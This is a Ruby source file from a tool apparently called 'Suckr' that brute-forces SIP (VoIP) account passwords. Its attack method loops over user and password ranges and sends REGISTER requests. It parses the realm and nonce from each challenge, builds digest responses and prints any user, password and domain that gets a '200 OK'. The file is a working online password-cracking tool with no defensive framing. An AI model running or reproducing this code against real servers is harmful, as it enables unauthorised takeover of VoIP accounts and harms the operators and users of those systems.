module Suckr
    class Target
        attr_accessor :domain,:port,:uri
        def initialize(domain,port,socket)
            @domain = domain
            @port = port
            @uri = "sip:#{@domain}"
            @socket = socket
        end

        def enumerate_users

        end

        def attack(range, pwd_range)
            for user in range
                #TODO need to separate parsing responses to a separate structure
                puts "brute forcing user #{user} on #{@domain} with password range #{pwd_range}"
                start = Time.now
                for pass in pwd_range

                    # send a registration message
                    @socket.send(Suckr::Sip.send_register(@uri,@port,user,@domain),0,@domain,@port)

                    # listen for response
                    reg_response=@socket.recvfrom(1755)

                    # get the Authorization header and parse out the realm and nonce
                    realm=""
                    nonce=""
                    reg_response[0].split("\r\n").each do | header |
                        if(header =~ /^WWW-Authenticate/)
                            if(header =~ /realm="([a-zA-Z0-9_\.]+)"/)
                                realm=$1
                            end
                            if(header =~ /nonce="([a-zA-Z0-9_\.]+)"/)
                                nonce=$1
                            end
                        end
                    end

                    # generate the reponse
                    if(realm!="" && nonce!="")
                      response=Suckr::Response.create(user,realm,pass,@uri,nonce)
                    end

                    # send the sip message
                    @socket.send(Suckr::Sip.send_register_auth(@uri,@port,user,@domain,realm,nonce,response),0,@domain,@port)

                    # listen for response
                    auth_response=@socket.recvfrom(1755)
                    if(auth_response[0] =~ /200 OK/)
                       puts "#{user},#{pass},#{@domain}"
                       # we have cracked a password - so we can break out of the inner loop
                       elapsed = Time.now - start
                       puts "<-- took #{elapsed} seconds to crack user #{user} -->"
                       break
                    end
                end 
            end

        end
    end
end